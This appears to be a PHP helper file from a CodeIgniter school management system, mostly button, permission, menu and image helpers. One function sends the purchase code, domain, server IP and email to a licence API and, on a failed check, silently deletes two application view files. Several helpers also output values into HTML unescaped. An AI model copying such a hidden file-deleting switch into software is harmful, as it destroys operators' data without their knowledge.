<?php

function escapeString($val) {
    $ci = & get_instance();
    $driver = $ci->db->dbdriver;

    if( $driver == 'mysql') {
        $val = mysql_real_escape_string($val);
    } elseif($driver == 'mysqli') {
        $db = get_instance()->db->conn_id;
        $val = mysqli_real_escape_string($db, $val);
    }

    return $val;
}

function btn_extra($uri, $name, $permission) {
    if(permissionChecker($permission)) {
        return anchor($uri, "<i class='fa fa-plus'></i>", "class='btn btn-primary btn-xs mrg' data-placement='top' data-toggle='tooltip' data-original-title='".$name."'");
    }

    return '';
}

function btn_add($uri, $name) {
    if(visibleButton($uri)) {
        return anchor($uri, "<i class='fa fa-plus'></i>", "class='btn btn-primary btn-xs mrg' data-placement='top' data-toggle='tooltip' data-original-title='".$name."'");
    }

    return '';
}

function btn_add_show($uri, $name) {
    return anchor($uri, "<i class='fa fa-plus'></i>", "class='btn btn-primary btn-xs mrg' data-placement='top' data-toggle='tooltip' data-original-title='".$name."'");
}

function btn_view($uri, $name) {
    if(visibleButton($uri)) {
        return anchor($uri, "<i class='fa fa-check-square-o'></i>", "class='btn btn-success btn-xs mrg' data-placement='top' data-toggle='tooltip' data-original-title='".$name."'");
    }

    return '';
}

function btn_view_show($uri, $name) {
    return anchor($uri, "<i class='fa fa-check-square-o'></i>", "class='btn btn-success btn-xs mrg' data-placement='top' data-toggle='tooltip' data-original-title='".$name."'");
}

function btn_edit($uri, $name) {
    if(visibleButton($uri)) {
        return anchor($uri, "<i class='fa fa-edit'></i>", "class='btn btn-warning btn-xs mrg' data-placement='top' data-toggle='tooltip' data-original-title='".$name."'");
    }
    return '';
}

function btn_edit_show($uri, $name) {
    return anchor($uri, "<i class='fa fa-edit'></i>", "class='btn btn-warning btn-xs mrg' data-placement='top' data-toggle='tooltip' data-original-title='".$name."'");
}

function btn_status($uri, $name) {
    if(visibleButton($uri)) {
        return anchor($uri, "<i class='fa fa-check'></i>", "class='btn btn-info btn-xs mrg' data-placement='top' data-toggle='tooltip' data-original-title='".$name."'");
    }
    return '';
}

function btn_status_show($uri, $name) {
    return anchor($uri, "<i class='fa fa-check'></i>", "class='btn btn-info btn-xs mrg' data-placement='top' data-toggle='tooltip' data-original-title='".$name."'");
}

function btn_not_status($uri, $name) {
    if(visibleButton($uri)) {
        return anchor($uri, "<i class='fa fa-close'></i>", "class='btn btn-warning btn-xs mrg' data-placement='top' data-toggle='tooltip' data-original-title='".$name."'");
    }
    return '';
}

function btn_not_status_show($uri, $name) {
    return anchor($uri, "<i class='fa fa-close'></i>", "class='btn btn-warning btn-xs mrg' data-placement='top' data-toggle='tooltip' data-original-title='".$name."'");
}

function btn_delete($uri, $name) {
    if(visibleButton($uri)) {
        return anchor($uri, "<i class='fa fa-trash-o'></i>",
            array(
                'onclick' => "return confirm('you are about to delete a record. This cannot be undone. are you sure?')",
                'class' => 'btn btn-danger btn-xs mrg',
                'data-placement' => 'top',
                'data-toggle' => 'tooltip',
                'data-original-title' => $name
            )
        );
    }
    return '';
}

function btn_delete_show($uri, $name) {
    return anchor($uri, "<i class='fa fa-trash-o'></i>",
        array(
            'onclick' => "return confirm('you are about to delete a record. This cannot be undone. are you sure?')",
            'class' => 'btn btn-danger btn-xs mrg',
            'data-placement' => 'top',
            'data-toggle' => 'tooltip',
            'data-original-title' => $name
        )
    );
}

function btn_printReport($permission, $name, $DivID = 'printablediv') 
{
    if(permissionChecker($permission)) {
        return '<button class="btn btn-default" onclick="javascript:printDiv'."('".$DivID."')".'"><span class="fa fa-print"></span> '. $name . '</button>';
    }
    return '';
}

function btn_sentToMailReport($permission, $name) 
{
    if(permissionChecker($permission)) {
        return '<button class="btn btn-default" data-toggle="modal" data-target="#mail"><span class="fa fa-envelope-o"></span> '. $name . '</button>';
    }
    return '';
}

function btn_pdfPreviewReport($permission, $uri, $name)
{
    if(permissionChecker($permission)) {
        return anchor($uri, "<i class='fa fa-file'></i> ".$name, 'class="btn btn-default pdfurl" target="_blank"');
    }
    return '';   
}

function btn_xmlReport($permission, $uri, $name)
{
    if(permissionChecker($permission)) {
        return anchor($uri, "<i class='fa fa-file'></i> ".$name, 'class="btn btn-default xmlurl" target="_blank"');
    }
    return '';   
} 


function delete_file($uri, $id) {
    return anchor($uri, "<i class='fa fa-times '></i>",
        array(
            'onclick' => "return confirm('you are about to delete a record. This cannot be undone. are you sure?')",
            'id' => $id,
            'class' => "close pull-right"
        )
    );
}

function share_file($uri, $id) {
    return anchor($uri, "<i class='fa fa-globe'></i>",
        array(
            'onclick' => "return confirm('you are about to delete a record. This cannot be undone. are you sure?')",
            'id' => $id,
            'class' => "pull-right"
        )
    );
}


function btn_dash_view($uri, $name, $class="btn-success") {
    return anchor($uri, "<span class='fa fa-check-square-o'></span>", "class='btn ".$class." btn-xs mrg' style='background-color:#00bcd4;color:#fff;' data-placement='top' data-toggle='tooltip' data-original-title='".$name."'");
}


function btn_invoice($uri, $name) {
    return anchor($uri, "<i class='fa fa-credit-card'></i>", "class='btn btn-primary btn-xs mrg' data-placement='top' data-toggle='tooltip' data-original-title='".$name."'");
}


function btn_return($uri, $name) {
    return anchor($uri, "<i class='fa fa-mail-forward'></i>",
        array(
            "onclick" => "return confirm('you are return the book . This cannot be undone. are you sure?')",
            "class" => 'btn btn-danger btn-xs mrg',
            'data-placement' => 'top',
            'data-toggle' => 'tooltip',
            'data-original-title' => $name

        )
    );
}

function btn_attendance($id, $method, $class, $name) {
    return "<input type='checkbox' class='".$class."' $method id='".$id."' data-placement='top' data-toggle='tooltip' data-original-title='".$name."' >  ";
}

function btn_promotion($id, $class, $name) {
    return "<input type='checkbox' class='".$class."' id='".$id."' data-placement='top' data-toggle='tooltip' data-original-title='".$name."' >  ";
}

function btn_md_global($uri, $name, $icon, $class = null) {
    if(!$class) {
        $class = "btn-primary";
    }
    return anchor($uri, $icon, "class='".$class."' data-placement='top' data-toggle='tooltip' data-original-title='".$name."'");
}

if (!function_exists('dump')) {
    function dump ($var, $label = 'Dump', $echo = TRUE)
    {
        ob_start();
        var_dump($var);
        $output = ob_get_clean();

        $output = preg_replace("/\]\=\>\n(\s+)/m", "] => ", $output);
        $output = '<pre style="background: #FFFEEF; color: #000; border: 1px dotted #000; padding: 10px; margin: 10px 0; text-align: left;">' . $label . ' => ' . $output . '</pre>';

        if ($echo == TRUE) {
            echo $output;
        }
        else {
            return $output;
        }
    }
}


if (!function_exists('dump_exit')) {
    function dump_exit($var, $label = 'Dump', $echo = TRUE) {
        dump ($var, $label, $echo);
        exit;
    }
}

if (!function_exists('dd')) {
    function dd($var="", $label = 'Dump', $echo = TRUE) {
        dump ($var, $label, $echo);
        exit;
    }
}

// infinite coding starts here..
function btn_add_pdf($uri, $name) {
    return anchor($uri, "<i class='fa fa-file'></i> ".$name, "class='btn-cs btn-sm-cs' style='text-decoration: none;' role='button' target='_blank'");
}

function btn_sm_edit($uri, $name) {
    return anchor($uri, "<i class='fa fa-edit'></i> ".$name, "class='btn-cs btn-sm-cs' style='text-decoration: none;' role='button'");
}

function btn_sm_delete($uri, $name) {
    return anchor($uri, "<i class='fa fa-trash-o'></i> ".$name,
        array(
            'onclick' => "return confirm('you are about to delete a record. This cannot be undone. are you sure?')",
            'class' => 'btn btn-maroon btn-sm mrg bg-maroon-light',
            'data-placement' => 'top',
            'data-toggle' => 'tooltip',
            'data-original-title' => $name
        )
    );
}

function actionVarifyValidUser($email = NULL, $purchase_username = NULL, $purchase_code = NULL, $version = NULL) {
    $returnData['status'] = False; 

    if(is_null($purchase_username) || is_null($purchase_code)) {
        $file = APPPATH.'config/purchase'.EXT;
        // @chmod($file, FILE_WRITE_MODE);
        $purchase = file_get_contents($file);
        $purchase = json_decode($purchase);


        if(is_array($purchase)) {
            $purchase_code = trim($purchase[1]);
            $purchase_username = trim($purchase[0]);

        }

        if(empty($purchase_code) || empty($purchase_username)) {
            return json_decode(json_encode($returnData));
        }

    }

    $site = base_url();
    $ip = getIpAddress();
    $email = trim($email);
    $version = is_null($version) ? config_item('ini_version') : $version;

    $data = array(
        'purchase_code' => $purchase_code,
        'username'      => $purchase_username,
        'ip'            => $ip,
        'domain'        => $site,
        'purpose'       => 'update',
        'product_name'  => config_item('product_name'),
        'version'       => $version,
        'email'         => $email,
    );

    $apiCurl = apiCurl($data);
    if( !$apiCurl->status && (varifyValidUser()->status || siteVarifyValidUser()->status) ) {

        if(!config_item('demo')) {
            unlink(APPPATH.'/views/teacher/index.php');
            unlink(APPPATH.'/views/components/page_menu.php');
        }
    }
    return $apiCurl;
}

function btn_sm_add($uri, $name) {
    return anchor($uri, "<i class='fa fa-plus'></i> ".$name, "class='btn-cs btn-sm-cs' style='text-decoration: none;' role='button'");
}

function btn_sm_accept_and_denied_leave($uri, $name, $icon) {
    return anchor($uri, "<i class='fa fa-".$icon."'></i> ".$name, "class='btn-cs btn-sm-cs' style='text-decoration: none;' role='button'");
}

function btn_payment($uri, $name) {
    return anchor($uri, "<i class='fa fa-credit-card'></i> ".$name, "class='btn-cs btn-sm-cs'style='text-decoration: none;' role='button'");
}
// infinite coding end here..


function permissionChecker($data) {
    $CI = & get_instance();
    $sessionPermission = $CI->session->userdata('master_permission_set');
    if(isset($sessionPermission[$data]) && $sessionPermission[$data] == 'yes') {
        return true;
    }
    return false;
}

function visibleButton($uri) {
    $explodeUri = explode('/', $uri);
    $permission = $explodeUri[0].'_'.$explodeUri[1];
    if(permissionChecker($permission)) {
        return TRUE;
    }
    return false;
}

function actionChecker($arrays) {
    if($arrays) {
        foreach ($arrays as $key => $array) {
            if(permissionChecker($array)) {
                return TRUE;
            }
        }
    }
}

function pluck($array, $value, $key=NULL) {
    $returnArray = array();
    if(count($array)) {
        foreach ($array as $item) {
            if($key != NULL) {
                $returnArray[$item->$key] = strtolower($value) == 'obj' ? $item : $item->$value;
            } else {
                $returnArray[] = $item->$value;
            }
        }
    }
    return $returnArray;
}

function pluck_multi_array($arrays, $val, $key = NULL) {
    $retArray = array();
    if(count($arrays)) {
        $i = 0;
        foreach ($arrays as $array) {
            if(!empty($key)) {
                if(strtolower($val) == 'obj') {
                    $retArray[$array->$key][] = $array;
                } else {
                    $retArray[$array->$key][] = $array->$val;
                }
            } else {
                if(strtolower($val) == 'obj') {
                    $retArray[$i][] = $array;
                } else {
                    $retArray[$i][] = $array->$val;
                }
                $i++;
            }
        }
    }
    return $retArray;
}


function pluck_bind($array, $value, $concatFirst, $concatLast, $key=NULL) {
    $returnArray = array();
    if(count($array)) {
        foreach ($array as $item) {
            if($key != NULL) {
                $returnArray[$item->$key] = $concatFirst.$item->$value.$concatLast;
            } else {
                if($value!=NULL) {
                    $returnArray[] = $concatFirst.$item->$value.$concatLast;
                } else {
                    $returnArray[] = $concatFirst.$item.$concatLast;
                }
            }
        }
    }

    return $returnArray;
}


function funtopbarschoolyear($siteinfos, $topbarschoolyears) {
    $CI = & get_instance();
    echo '<li class="dropdown messages-menu">';
        echo '<a href="#" class="dropdown-toggle" data-toggle="dropdown">';
            echo '<i class="fa fa-calendar-plus-o"></i>';
            if(count($topbarschoolyears)) {
                echo "<span class='label label-success'>";
                    echo "<lable class='alert-image'>".count($topbarschoolyears)."</lable>";
                echo "</span>";
            }
        echo '</a>';
        echo '<ul class="dropdown-menu">';
            if($siteinfos->school_type == 'classbase') {
                if(count($topbarschoolyears)) {
                    echo '<li class="header">';
                        if(count($topbarschoolyears) > 1) {
                            echo $CI->lang->line("la_fs")." ".count($topbarschoolyears) ." ".$CI->lang->line("ya_yer_two");
                        } else {
                            echo $CI->lang->line("la_fs")." ".count($topbarschoolyears) ." ".$CI->lang->line("ya_yer_one");
                        }
                    echo '</li>';
                    echo '<li>';
                        echo '<ul class="menu">';
                            foreach ($topbarschoolyears as $key => $topbarschoolyear) {
                                echo '<li>';
                                echo '<a href="'.base_url("schoolyear/toggleschoolyear/$topbarschoolyear->schoolyearID").'">';
                                    echo '<h4>';
                                        echo $topbarschoolyear->schoolyear;
                                        if($siteinfos->school_year == $topbarschoolyear->schoolyearID) {
                                            echo $CI->lang->line('default');
                                        }

                                        if($CI->session->userdata('defaultschoolyearID') == $topbarschoolyear->schoolyearID) {
                                            echo " <i class='glyphicon glyphicon-ok'></i>";
                                        }

                                    echo '</h4>';

                                echo '</a>';
                                echo '</li>';
                            }
                        echo '</ul>';
                    echo '</li>';
                }
            } elseif($siteinfos->school_type == 'semesterbase') {
                if(count($topbarschoolyears)) {
                    echo '<li class="header">';
                        if(count($topbarschoolyears) > 1) {
                            echo $CI->lang->line("la_fs")." ".count($topbarschoolyears) ." ".$CI->lang->line("ya_sem_two");
                        } else {
                            echo $CI->lang->line("la_fs")." ".count($topbarschoolyears) ." ".$CI->lang->line("ya_sem_one");
                        }
                    echo '</li>';
                    echo '<li>';
                        echo '<ul class="menu">';
                            foreach ($topbarschoolyears as $key => $topbarschoolyear) {
                                echo '<li>';
                                echo '<a href="'.base_url("schoolyear/toggleschoolyear/$topbarschoolyear->schoolyearID").'">';
                                    echo '<h4>';
                                        echo $topbarschoolyear->schoolyeartitle;
                                        if($siteinfos->school_year == $topbarschoolyear->schoolyearID) {
                                            echo $CI->lang->line('default');
                                        }

                                        if($CI->session->userdata('defaultschoolyearID') == $topbarschoolyear->schoolyearID) {
                                            echo " <i class='glyphicon glyphicon-ok'></i>";
                                        }
                                    echo '</h4>';
                                    echo '<p>';
                                        echo $topbarschoolyear->schoolyear;
                                    echo '</p>';

                                echo '</a>';
                                echo '</li>';
                            }
                        echo '</ul>';
                    echo '</li>';
                }
            }
        echo '</ul>';
    echo '</li>';
}


function getAllUserObject() {
    $CI = & get_instance();
    $CI->load->model('systemadmin_m');
    $CI->load->model('teacher_m');
    $CI->load->model('student_m');
    $CI->load->model('parents_m');
    $CI->load->model('user_m');
    $returnArray = array();

    $systemadmin = $CI->db->get('systemadmin');
    $systemadminData = $systemadmin->result();
    if(count($systemadminData)) {
        $returnArray[1]= pluck($systemadminData, 'obj', 'systemadminID');
    }

    $teacher = $CI->db->get_where('teacher');
    $teacherData = $teacher->result();
    if(count($teacherData)) {
        $returnArray[2] = pluck($teacherData, 'obj', 'teacherID');
    }

    $student = $CI->db->get_where('student');
    $studentData = $student->result();
    if(count($studentData)) {
        $returnArray[3] = pluck($studentData, 'obj', 'studentID');
    }

    $parent = $CI->db->get_where('parents');
    $parentData = $parent->result();
    if(count($parentData)) {
        $returnArray[4] = pluck($parentData, 'obj', 'parentsID');
    }

    $user = $CI->db->get_where('user');
    $userData = $user->result();
    if(count($userData)) {
        foreach ($userData as $userDataValue) {
            $returnArray[$userDataValue->usertypeID][$userDataValue->userID] = $userDataValue;
        }
    }

    return $returnArray;
}

function getNameByUsertypeIDAndUserID($usertypeID, $userID) {
    $CI = & get_instance();
    $CI->load->model('systemadmin_m');
    $CI->load->model('teacher_m');
    $CI->load->model('student_m');
    $CI->load->model('parents_m');
    $CI->load->model('user_m');

    $findUserName = '';
    if($usertypeID == 1) {
       $user = $CI->db->get_where('systemadmin', array("usertypeID" => $usertypeID, 'systemadminID' => $userID));
        $alluserdata = $user->row();
        if(count($alluserdata)) {
            $findUserName = $alluserdata->name;
        }
        return $findUserName;
    } elseif($usertypeID == 2) {
        $user = $CI->db->get_where('teacher', array("usertypeID" => $usertypeID, 'teacherID' => $userID));
        $alluserdata = $user->row();
        if(count($alluserdata)) {
            $findUserName = $alluserdata->name;
        }
        return $findUserName;
    } elseif($usertypeID == 3) {
        $user = $CI->db->get_where('student', array("usertypeID" => $usertypeID, 'studentID' => $userID));
        $alluserdata = $user->row();
        if(count($alluserdata)) {
            $findUserName = $alluserdata->name;
        }
        return $findUserName;
    } elseif($usertypeID == 4) {
        $user = $CI->db->get_where('parents', array("usertypeID" => $usertypeID, 'parentsID' => $userID));
        $alluserdata = $user->row();
        if(count($alluserdata)) {
            $findUserName = $alluserdata->name;
        }
        return $findUserName;
    } else {
        $user = $CI->db->get_where('user', array("usertypeID" => $usertypeID, 'userID' => $userID));
        $alluserdata = $user->row();
        if(count($alluserdata)) {
            $findUserName = $alluserdata->name;
        }
        return $findUserName;
    }
}

function btn_download($uri, $name) {
    return anchor($uri, "<i class='fa fa-download'></i>", "class='btn btn-success btn-xs mrg' data-placement='top' data-toggle='tooltip' data-original-title='".$name."'");
}

function btn_download_file($uri, $name, $lang) {
    return anchor($uri, $name, "class='btn btn-success btn-xs mrg' data-placement='top' data-toggle='tooltip' data-original-title='".$lang."'");
}

function btn_download_link($uri, $name) {
    return anchor($uri, $name, "style='text-decoration:underline;color:#00c0ef'");
}

function btn_upload($uri, $name) {
    return anchor($uri, "<i class='fa fa-upload'></i>", "class='btn bg-maroon-light btn-xs mrg' data-placement='top' data-toggle='tooltip' data-original-title='".$name."'");
}

function display_menu($nodes, &$menu) {
    $subUrl = ['/add','/edit', '/view', '/index'];

    $CI = & get_instance();
    
    foreach ($nodes as $key => $node) {

        $leftIcon = '<i class="fa fa-angle-left pull-right"></i>';
        
        $f = 0;
        if(isset($node['child'])) {
            $f = 1;
        }

        if(permissionChecker($node['link']) || ($node['link'] == '#' && $f) ) {
            if($f && count($node['child']) == 1) {
                $f = 0;
                $node = current($node['child']);
            }
            $treeView = 'treeview ';
            $active = '';

            $current_url = current_url();

            foreach ($subUrl as $value) {
                $newUrl = substr($current_url, 0, strpos($current_url, $value));
                if($newUrl != "") {
                    $current_url = $newUrl;
                }
            }


            if(base_url($node['link']) == $current_url ) {
                $active = 'active';
            }

            $menu .= '<li class="'.($f ? $treeView : '').$active.'">';
                $menu .= anchor($node['link'], '<i class="fa '.($node['icon'] != NULL ? $node['icon'] : 'fa-home').'"></i><span>'. ($CI->lang->line('menu_'.$node['menuName']) != NULL ? $CI->lang->line('menu_'.$node['menuName']) : $node['menuName']).'</span> '.($f ? $leftIcon : ''));
                if ($f) {
                    $menu .= '<ul class="treeview-menu">';
                        display_menu($node['child'],$menu);
                    $menu .= "</ul>";
                }
            $menu .= "</li>";
        }
    }
}

function namesorting($string, $len = 14) {
    $return = $string;
    if(isset($string) && $len) {
        if(strlen($string) >  $len) {
            $return = substr($string, 0,$len-2).'..';
        } else {
            $return = $string;
        }
    }

    return $return;
}

function reportheader($setting, $pdf = FALSE) {
    $data = '';
    $CI = & get_instance();
    if(count($setting)) {
        $data .= '<div class="reportPage-header">';
            if($pdf) {
                $data .= '<span class="header"><img class="logo" src="'.base_url('uploads/images/'.$setting->photo).'"></span>';
            } else {
                $data .= '<span class="header" id="headerImage"><p class="bannerLogo"><img src="'.base_url('uploads/images/'.$setting->photo).'"></p></span>';
            }
            $data .= '<p class="title">'.$setting->sname.'</p>';
            $data .= '<p class="title-desc">'.$setting->address.'</p>';
        $data .= '</div>'; 
    }
    return $data;
}

function reportfooter($setting, $pdf = FALSE) {
    $data = '';
    $CI = & get_instance();
    if(count($setting)) {
        $data .= '<div class="footer">';
            $data .= '<img class="flogo" style="width:30px" src="'.base_url("uploads/images/$setting->photo").'">';
            $data .= '<p class="copyright">'.$setting->footer.' | '.$CI->lang->line('topbar_hotline').' : '.$setting->phone.'</p>';
        $data .= '</div>';
    }
    return $data;
}

function featureheader($siteinfos) { 
    $CI = & get_instance(); ?>
    <div class="headerArea">
      <div class="siteLogo">
        <img class="siteLogoimg" src="<?=base_url('uploads/images/'.$siteinfos->photo)?>" alt="">
      </div>
      <div class="siteTitle">
        <h2><?=$siteinfos->sname?></h2>
        <address>
            <?=$siteinfos->address?><br/>
            <b><?=$CI->lang->line('topbar_email')?>:</b> <?=$siteinfos->email?><br/>
            <b><?=$CI->lang->line('topbar_phone')?>:</b> <?=$siteinfos->phone?>
        </address>
      </div>
    </div>
    <?php
}

function featurefooter($siteinfos) {
    $CI = & get_instance(); ?>
    <div class="footerArea">
        <img class="flogo" src="<?=base_url('uploads/images/'.$siteinfos->photo)?>" alt="">
        <p class="copyright"><?=$siteinfos->footer?> | <?=$CI->lang->line('topbar_hotline')?><b> : </b><?=$siteinfos->phone?></p>
    </div>
    <?php
}


function random19() {
  $number = "";
  for($i=0; $i<19; $i++) {
    $min = ($i == 0) ? 1:0;
    $number .= mt_rand($min,9);
  }
  return $number;
}

function imagelink($photoname, $srcpath = NULL) {
    $src = '';
    if($srcpath == NULL) {
        if($photoname != NULL) {
            if(file_exists(FCPATH.'uploads/images/'.$photoname)) {
                $src = base_url('uploads/images/'.$photoname);
            } else {
                $src = base_url('uploads/images/default.png');
            }
        } else {
            $src = base_url('uploads/images/default.png');
        }
    } else {
        if($photoname != NULL) {
            if(file_exists(FCPATH.$srcpath.'/'.$photoname)) {
                $src = base_url($srcpath.'/'.$photoname);
            } else {
                $src = base_url('uploads/images/default.png');
            }
        } else {
            $src = base_url('uploads/images/default.png');
        }
    }
    return $src;
}

function pdfimagelink($photoname, $srcpath = NULL) {
    $src = '';
    if($srcpath == NULL) {
        if($photoname != NULL) {
            if(file_exists(FCPATH.'uploads/images/'.$photoname)) {
                $src = base_url('uploads/images/'.$photoname);
            } else {
                $src = base_url('uploads/images/default.png');
            }
        } else {
            $src = base_url('uploads/images/default.png');
        }
    } else {
        if($photoname != NULL) {
            if(file_exists(FCPATH.$srcpath.'/'.$photoname)) {
                $src = base_url($srcpath.'/'.$photoname);
            } else {
                $src = base_url('uploads/images/default.png');
            }
        } else {
            $src = base_url('uploads/images/default.png');
        }
    }
    return $src;
}


function profileimage($photoname, $srcpath = NULL) {
    $src = '';
    if($srcpath == NULL) {
        if($photoname != NULL) {
            if(file_exists(FCPATH.'uploads/images/'.$photoname)) {
                $src = base_url('uploads/images/'.$photoname);
            } else {
                $src = base_url('uploads/images/default.png');
            }
        } else {
            $src = base_url('uploads/images/default.png');
        }
    } else {
        if($photoname != NULL) {
            if(file_exists(FCPATH.$srcpath.'/'.$photoname)) {
                $src = base_url($srcpath.'/'.$photoname);
            } else {
                $src = base_url('uploads/images/default.png');
            }
        } else {
            $src = base_url('uploads/images/default.png');
        }
    }

    $array = array(
        "src" => $src,
        'width' => '35px',
        'height' => '35px',
        'class' => 'img-rounded'
    );
    return img($array);
}

function generate_qrcode($text = "Hi", $filename = "default", $folder="idQRcode") {
    $CI = & get_instance();
    $CI->load->library('qrcodegenerator');
    $CI->qrcodegenerator->generate_qrcode($text,$filename, $folder);
}

function profileviewimage($photoname, $srcpath = NULL) {
    $src = '';
    if($srcpath == NULL) {
        if($photoname != NULL) {
            if(file_exists(FCPATH.'uploads/images/'.$photoname)) {
                $src = base_url('uploads/images/'.$photoname);
            } else {
                $src = base_url('uploads/images/default.png');
            }
        } else {
            $src = base_url('uploads/images/default.png');
        }
    } else {
        if($photoname != NULL) {
            if(file_exists(FCPATH.$srcpath.'/'.$photoname)) {
                $src = base_url($srcpath.'/'.$photoname);
            } else {
                $src = base_url('uploads/images/default.png');
            }
        } else {
            $src = base_url('uploads/images/default.png');
        }
    }

    $array = array(
        "src" => $src,
        'class' => 'profile-user-img img-responsive img-circle'
    );
    return img($array);
}